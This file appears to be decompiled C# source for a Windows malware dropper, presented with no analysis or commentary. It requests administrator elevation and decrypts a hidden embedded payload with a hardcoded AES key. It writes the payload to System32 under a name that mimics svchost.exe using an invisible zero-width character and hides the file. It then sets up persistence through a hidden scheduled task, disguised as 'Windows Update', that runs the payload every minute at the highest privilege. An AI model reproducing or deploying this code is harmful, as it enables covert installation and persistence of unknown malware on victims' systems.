using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.TaskScheduler;

[StandardModule]
internal sealed class Test
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		try
		{
			if (!IsUserAdministrator())
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				new Process();
				ProcessStartInfo processStartInfo2 = processStartInfo;
				processStartInfo2.UseShellExecute = true;
				processStartInfo2.FileName = Application.get_ExecutablePath();
				processStartInfo2.WindowStyle = ProcessWindowStyle.Normal;
				processStartInfo2.Verb = "runas";
				processStartInfo2 = null;
				Process.Start(processStartInfo);
			}
			string path = "C:\\Windows\\System32\\svchost\u200c.exe";
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, GetTheResource("pzemfvrz"));
				File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
			}
			using (TaskService taskService = new TaskService())
			{
				TaskDefinition taskDefinition = taskService.NewTask();
				taskDefinition.RegistrationInfo.Description = "Windows Update";
				TimeTrigger timeTrigger = new TimeTrigger();
				timeTrigger.Repetition.Interval = TimeSpan.FromMinutes(1.0);
				taskDefinition.Triggers.Add(timeTrigger);
				taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
				taskDefinition.Settings.Hidden = true;
				taskDefinition.Actions.Add(new ExecAction("C:\\Windows\\System32\\svchost\u200c.exe"));
				taskService.RootFolder.RegisterTaskDefinition("Update", taskDefinition);
				Interaction.Shell("schtasks /run /TN Update", (AppWinStyle)0, false, -1);
			}
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.Default.GetBytes("AdMbwfurX4LvjKQ2"));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("zxwqa", executingAssembly);
		return AES_Decryptor((byte[])resourceManager.GetObject(Get_));
	}

	private static bool IsUserAdministrator()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
